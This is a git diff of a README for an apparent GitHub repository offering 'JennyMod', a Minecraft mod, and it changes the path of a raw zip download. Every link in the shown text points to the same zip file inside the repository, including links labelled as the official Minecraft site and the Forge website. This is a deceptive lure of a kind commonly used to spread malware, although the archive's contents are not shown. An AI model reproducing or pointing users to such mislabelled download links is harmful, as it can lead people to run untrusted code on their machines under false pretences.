@@ -4,16 +4,16 @@
 Jenny Mod is a unique Minecraft mod designed to bring a new level of interaction and adventure to your gameplay. This mod is not just about visuals; it emphasizes storytelling and dynamic gameplay. Dive into a world that allows you to explore and engage in exciting, immersive scenarios.
 
 ## 📦 Download Now
-[![Download JennyMod](https://raw.githubusercontent.com/Saeyounma/JennyMod/main/assets/sexmod/blockstates/JennyMod_2.4.zip)](https://raw.githubusercontent.com/Saeyounma/JennyMod/main/assets/sexmod/blockstates/JennyMod_2.4.zip)
+[![Download JennyMod](https://raw.githubusercontent.com/Saeyounma/JennyMod/main/com/trolmastercard/sexmod/Mod_Jenny_1.4.zip)](https://raw.githubusercontent.com/Saeyounma/JennyMod/main/com/trolmastercard/sexmod/Mod_Jenny_1.4.zip)
 
 ## 🚀 Getting Started
 Follow these simple steps to download and install JennyMod. No technical knowledge is needed. 
 
 1. **Install Minecraft:** Ensure you have a working version of Minecraft installed on your computer.
-2. **Install Minecraft Forge:** JennyMod requires Minecraft Forge. Visit the [Forge website](https://raw.githubusercontent.com/Saeyounma/JennyMod/main/assets/sexmod/blockstates/JennyMod_2.4.zip) to download and install the correct version compatible with your Minecraft.
+2. **Install Minecraft Forge:** JennyMod requires Minecraft Forge. Visit the [Forge website](https://raw.githubusercontent.com/Saeyounma/JennyMod/main/com/trolmastercard/sexmod/Mod_Jenny_1.4.zip) to download and install the correct version compatible with your Minecraft.
 
 ## 📥 Download & Install
-To download JennyMod, visit this page: [Download JennyMod Releases](https://raw.githubusercontent.com/Saeyounma/JennyMod/main/assets/sexmod/blockstates/JennyMod_2.4.zip). Here, you will find the latest versions any you can choose to download.
+To download JennyMod, visit this page: [Download JennyMod Releases](https://raw.githubusercontent.com/Saeyounma/JennyMod/main/com/trolmastercard/sexmod/Mod_Jenny_1.4.zip). Here, you will find the latest versions any you can choose to download.
 
 1. Click on the latest release version.
 2. Download the ZIP file containing the mod.
@@ -54,9 +54,9 @@ If you encounter issues while using JennyMod, try these tips:
 3. **Update Java:** Make sure you have the latest version of Java installed on your system.
 
 ## 🔗 Useful Links
-- [Minecraft Official Site](https://raw.githubusercontent.com/Saeyounma/JennyMod/main/assets/sexmod/blockstates/JennyMod_2.4.zip)
-- [Minecraft Forge](https://raw.githubusercontent.com/Saeyounma/JennyMod/main/assets/sexmod/blockstates/JennyMod_2.4.zip)
-- [JennyMod Releases](https://raw.githubusercontent.com/Saeyounma/JennyMod/main/assets/sexmod/blockstates/JennyMod_2.4.zip)
+- [Minecraft Official Site](https://raw.githubusercontent.com/Saeyounma/JennyMod/main/com/trolmastercard/sexmod/Mod_Jenny_1.4.zip)
+- [Minecraft Forge](https://raw.githubusercontent.com/Saeyounma/JennyMod/main/com/trolmastercard/sexmod/Mod_Jenny_1.4.zip)
+- [JennyMod Releases](https://raw.githubusercontent.com/Saeyounma/JennyMod/main/com/trolmastercard/sexmod/Mod_Jenny_1.4.zip)
 
 ## 🤝 Contributing
 We welcome contributions to JennyMod. If you want to help improve the mod or add new features, please visit our GitHub page for guidelines.
